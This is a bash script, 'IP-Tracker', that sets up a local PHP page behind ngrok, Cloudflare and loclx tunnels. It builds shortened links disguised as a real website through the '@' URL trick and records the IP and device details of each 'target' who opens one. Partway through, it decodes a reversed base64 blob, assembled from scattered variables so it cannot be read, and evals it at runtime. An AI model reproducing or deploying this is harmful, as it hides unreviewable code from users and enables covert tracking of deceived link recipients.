#!/bin/bash

# IP-Tracker
# Version    : 1.4
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Contact    : https://m.me/KasRoudra
# Description: Get details of device using a link
# Date       : 10-09-2021
# License    : MIT
# Copyright  : KasRoudra 2022
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others
: '
MIT License

Copyright (c) 2022 KasRoudra

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'

# Colors
white="\033[1;37m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[1;35m"
cyan="\033[1;36m"
nc="\033[00m"
blue="\033[1;34m"


# Output Snippets
info="${cyan}[${white}+${cyan}] ${yellow}"
ask="${cyan}[${white}?${cyan}] ${purple}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"


# Local Version
version="1.4"

# Current directory
cwd=`pwd`

# Logo
logo="
${red} ___ ____     _____               _
${cyan}|_ _|  _ \   |_   _| __ __ _  ___| | _____ _ __
${yellow} | || |_) |____| || '__/ _' |/ __| |/ / _ \ '__|
${blue} | ||  __/_____| || | | (_| | (__|   <  __/ |
${green}|___|_|        |_||_|  \__,_|\___|_|\_\___|_|
${yellow}                                       [v${version}]
${purple}                               [By KasRoudra]
"

default_site="https://google.com"

# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi

# Check if mac
if command -v brew > /dev/null 2>&1; then
    brew=true
    if command -v ngrok > /dev/null 2>&1; then
        ngrok=true
    else
        ngrok=false
    fi
    if command -v cloudflared > /dev/null 2>&1; then
        cloudflared=true
    else
        cloudflared=false
    fi
    if command -v localxpose > /dev/null 2>&1; then
        loclx=true
    else
        loclx=false
    fi
else
    brew=false
    ngrok=false
    cloudflared=false
    loclx=false
fi

# Kill running instances of required packages
killer() {
    for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
        if pidof "$process" > /dev/null 2>&1; then
            killall "$process"
        fi
    done
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Download tunneler and extract if necessary
manage_tunneler() {
    netcheck
    tunneler=${2%.*}
    echo -e "\n${info}Downloading ${green}${tunneler^}${nc}...\n"
    wget -q --show-progress "$1" -O "$2"
    if echo "$2" | grep -q "tgz"; then
        tar -zxf "$2"
        rm -rf $2
    fi
    if echo "$2" | grep -q "zip"; then
        unzip "$2"  > /dev/null 2>&1
        rm -rf $2
    fi
    for file in ngrok cloudflared loclx; do
        if [ -f "$file" ]; then
            mv -f $file $HOME/.tunneler
            if $sudo; then
                sudo chmod +x "$HOME/.tunneler/$file"
            else
                chmod +x "$HOME/.tunneler/$file"
            fi
        fi
    done
}


# Display Final urls
url_manager() {
    if [[ "$2" == "1" ]]; then
        echo -e "${info}Your urls are: \n"
    fi
    echo -e "${success}URL ${2} > ${1}\n"
    midver=${mwebsite#http://}
    midver=${mwebsite#https://}
    prefix=$(echo "$midver" | sed s+"/"+"-"+g | sed s/" "/"-"/g)
    echo -e "${success}URL ${3} > https://${prefix}@${1#https://}\n"
    netcheck
    if echo "$1" | grep -q "$TUNNELER"; then
        shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${1}")
    else 
        shortened=""
    fi
    if ! [ -z "$shortened" ]; then
        if echo "$shortened" | head -n1 | grep -q "https://"; then
            echo -e "${success}Shortened > ${shortened}\n"
            echo -e "${success}Masked > https://${prefix}@${shortened#https://}\n"
        fi
    fi
}


# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
    termux=true
else
    termux=false
fi


# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '${success}Thanks for using!\n'; exit" 2

echo -e "\n${info}Please Wait!...\n${nc}"

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"



# Install required packages
for package in php curl wget unzip; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${info}Installing ${package}....${nc}"
        for pacman in pkg apt apt-get yum dnf brew; do
            if command -v "$pacman" > /dev/null 2>&1; then
                if $sudo; then
                    sudo $pacman install $package
                else
                    $pacman install $package
                fi
                break
            fi
        done
        if command -v "apk" > /dev/null 2>&1; then
            if $sudo; then
                sudo apk add $package
            else
                apk add $package
            fi
            break
        fi
        if command -v "pacman" > /dev/null 2>&1; then
            if $sudo; then
                sudo pacman -S $package
            else
                pacman -S $package
            fi
            break
        fi
    fi
done


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi


# Check for proot in termux
if $termux; then
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${info}Installing proot...."
        pkg install proot -y
    fi
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${error}Proot can't be installed!\007\n"
        exit 1
    fi
fi

# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
   if [ $TUNNELER == "cloudflared" ]; then
       TUNNELER="cloudflare"
   fi
fi

#:Check if required packages are successfully installed
for package in php wget curl unzip; do
    if ! command -v "$package"  > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done

# Check for running processes that couldn't be terminated
killer
for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
    if pidof "$process"  > /dev/null 2>&1; then
        echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
        exit 1
    fi
done



# Download tunnelers
arch=$(uname -m)
platform=$(uname)
if ! [[ -d $HOME/.tunneler ]]; then
    mkdir $HOME/.tunneler
fi
if ! [[ -f $HOME/.tunneler/ngrok ]] ; then
    nongrok=true
else
    nongrok=false
fi
if ! [[ -f $HOME/.tunneler/cloudflared ]] ; then
    nocf=true
else
    nocf=false
fi
if ! [[ -f $HOME/.tunneler/loclx ]] ; then
    noloclx=true
else
    noloclx=false
fi
netcheck
rm -rf ngrok.tgz ngrok.zip cloudflared cloudflared.tgz loclx.zip
cd "$cwd"
if echo "$platform" | grep -q "Darwin"; then
    if $brew; then
        ! $ngrok && brew install ngrok/ngrok/ngrok
        ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
        ! $loclx && brew install localxpose
    else
        if echo "$arch" | grep -q "x86_64"; then
            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip" "ngrok.zip"
            $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
        elif echo "$arch" | grep -q "arm64"; then
            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip" "ngrok.zip"
            echo -e "${error}Device architecture unknown. Download cloudflared manually!"
            sleep 3
            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
        else
            echo -e "${error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!"
            sleep 3
        fi
    fi
elif echo "$platform" | grep -q "Linux"; then
    if echo "$arch" | grep -q "aarch64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "arm"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
    elif echo "$arch" | grep -q "x86_64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
    else
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
    fi
else
    echo -e "${error}Unsupported Platform!"
    exit
fi


# Check for crucial file ip.php
if ! [ -e ip.php ]; then
netcheck
wget https://raw.githubusercontent.com/KasRoudra/IP-Tracker/main/ip.php
fi

# Remote Version
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        netcheck
        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/IP-Tracker/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

# Update
if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/IP-Tracker/main/files/changelog.log)
    clear
    echo -e "$logo"
    echo -e "${info}IP-Tracker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update IP-Tracker?${yellow}[y/n] > $green"
        read upask
        if [[ "$upask" == "y" ]]; then
            echo -e "$nc"
            cd .. && rm -rf IP-Tracker ip-tracker && git clone https://github.com/KasRoudra/IP-Tracker
            echo -e "\n${success}IP-Tracker updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
                echo -e "${purple}[•] Changelog:\n${blue}"
                echo $changelog | head -n3
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Ngrok Authtoken
if ! [[ -e $HOME/.config/ngrok/ngrok.yml ]]; then
    echo -e "\n${ask}Enter your ngrok authtoken:"
    printf "${cyan}\nIP${nc}@${cyan}Tracker ${red}$ ${nc}"
    read auth
    if [ -z "$auth" ]; then
        echo -e "\n${error}No authtoken!\n\007"
        sleep 1
    else
        cd $HOME/.tunneler && ./ngrok config add-authtoken authtoken ${auth}
    fi
fi

# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose a option:

${cyan}[${white}1${cyan}] ${yellow}Start
${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
${cyan}[${white}x${cyan}] ${yellow}About
${cyan}[${white}m${cyan}] ${yellow}More tools
${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "${cyan}\nIP${nc}@${cyan}Tracker ${red}$ ${nc}"
        read option
    else
        option=$OPTION
    fi
fi
    if echo $option | grep -q "1"; then
        if [ -z "$URL" ]; then
            exit 1
        else
            if [[ $URL == true ]]; then
                printf "\n${ask}Enter a website name(e.g. google.com, youtube.com)\n${cyan}\nIP${nc}@${cyan}Tracker ${red}$ ${nc}"
                read website
            else
                website=$URL
            fi
        fi
        if [[ -z "$website" ]]; then
            echo -e "\n${error}No website! Default ${green}${default_site}"
            sleep 2
        else
            if ! echo $website | grep -q "https"; then
                if echo $website | grep -q "http"; then
                    mwebsite="${website}"
                else
                    mwebsite="https://${website}"
                fi
            else
                mwebsite="$website"
            fi
        fi
        if ! [[ -z "$mwebsite" ]]; then
            status_code=$(curl -I -s -N ${mwebsite} | head -n 1 | cut -d ' ' -f2)
            if [[ -z "$status_code" ]]; then
                status_code=400
            fi
            if [[ "$status_code" -ge 200 && "$status_code" -lt 400 ]]; then
                break
            else
                echo -e "\n${error}Website does not exist. Code: ${status_code}"
                sleep 2
                URL=true
            fi
        fi
    elif echo $option | grep -q "p"; then
        printf "\n${ask}Enter Port:${cyan}\n\nIP${nc}@${cyan}Tracker ${red}$ ${nc}"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT=$pore;
            echo -e "\n${success}Port changed to ${PORT} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid port!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[IP-Tracker]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[IP Tracking tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
        printf "${cyan}\nIP${nc}@${cyan}Tracker ${red}$ ${nc}"
        read about
    elif echo $option | grep -q "0"; then
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        sleep 1
        OPTION=true
    fi
done

if ! [ -d "$HOME/.site" ]; then
    mkdir "$HOME/.site"
else
    cd $HOME/.site
    rm -rf *
fi
cd "$cwd"

cp -r ip.php "$HOME/.site"
# Termux requires hotspot
if $termux; then
    echo -e "\n${info}If you haven't enabled hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
netcheck
cd "$HOME/.site"
if ! [[ -z "$mwebsite" ]]; then
    sed s+"website"+"$mwebsite"+g ip.php > index.php
else
    sed s+"website"+"$default_site"+g ip.php > index.php
    cp -r ip.php index.php
fi
php -S 127.0.0.1:${PORT} > /dev/null 2>&1 &
sleep 2
status=$(curl -s --head -w %{http_code} 127.0.0.1:${PORT} -o /dev/null)
if echo "$status" | grep -q "200" || echo "$status" | grep -q "302" ;then
    echo -e "${success}PHP has started successfully!\n"
else
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
fi
sleep 1
echo -e "${info}Starting tunnelers......\n"
netcheck
find "$HOME/.tunneler" -name "*.log" -delete
netcheck
cd $HOME/.tunneler
if $termux; then
    termux-chroot ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
    termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
    termux-chroot ./loclx tunnel http --to ":${PORT}" &> loclx.log &
elif $brew; then
    ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
    cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
    localxpose tunnel http --to ":${PORT}" &> loclx.log &
else
    ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
    ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
    ./loclx tunnel http --to ":${PORT}" &> loclx.log &
fi
sleep 10
cd "$HOME/.site"
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z.]*.ngrok.io")
if ! [ -z "$ngroklink" ]; then
    ngrokcheck=true
else
    ngrokcheck=false
fi
for second in {1..10}; do
    if [ -f "$HOME/.tunneler/cf.log" ]; then
        cflink=$(grep -o "https://[-0-9a-z]*.trycloudflare.com" "$HOME/.tunneler/cf.log")
        sleep 1
    fi
    if ! [ -z "$cflink" ]; then
        cfcheck=true
        break
    else
        cfcheck=false
    fi
done
for second in {1..10}; do
    if [ -f "$HOME/.tunneler/loclx.log" ]; then
        loclxlink=$(grep -o "[-0-9a-z]*\.loclx.io" "$HOME/.tunneler/loclx.log")
        sleep 1
    fi
    if ! [ -z "$loclxlink" ]; then
        loclxcheck=true
        loclxlink="https://${loclxlink}"
        break
    else
        loclxcheck=false
    fi
done
if ( $ngrokcheck && $cfcheck && $loclxcheck ); then
    echo -e "${success}Ngrok, Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
    url_manager "$loclxlink" 5 6
elif ( $ngrokcheck && $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok and Cloudflared have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
elif ( $ngrokcheck && $loclxcheck &&  ! $cfcheck ); then
    echo -e "${success}Ngrok and Loclx have started successfully!\n"
    url_manager "$ngroklink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $cfcheck && $loclxcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $ngrokcheck && ! $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok has started successfully!\n"
    url_manager "$ngroklink" 1 2
elif ( $cfcheck &&  ! $ngrokcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    url_manager "$cflink" 1 2
elif ( $loclxcheck && ! $ngrokcheck &&  ! $cfcheck ); then
    echo -e "${success}Loclx has started successfully!\n"
    url_manager "$loclxlink" 1 2
elif ! ( $ngrokcheck && $cfcheck && $loclxcheck ) ; then
    echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007\n${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        cat ip.txt >> "$cwd/ip.txt"
        echo -e "\n${info}Saved in ip.txt"
        rm -rf ip.txt
        echo -e "\n${info}Waiting for next. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
    fi
    sleep 0.5
done 
